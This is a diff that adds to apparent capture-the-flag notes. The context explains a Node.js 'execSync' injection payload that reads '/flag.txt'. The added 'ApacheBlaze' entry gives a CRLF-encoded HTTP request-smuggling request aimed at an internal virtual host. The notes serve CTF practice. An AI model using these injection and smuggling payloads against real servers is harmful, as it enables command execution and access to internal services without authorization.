@@ -115,3 +115,9 @@ So, the whole line `require('child_process').execSync('cat /flag.txt').toString(
 
 It's important to note that using `execSync` to execute shell commands that include input from untrusted sources can be dangerous, as it can lead to command injection vulnerabilities. Always validate and sanitize external inputs when using them in shell commands.
 
+ApacheBlaze:
+Http request smuggling 
+GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/ HTTP/1.1
+Host: <Ip of the machine>
+...[other headers]...
+Connection: close
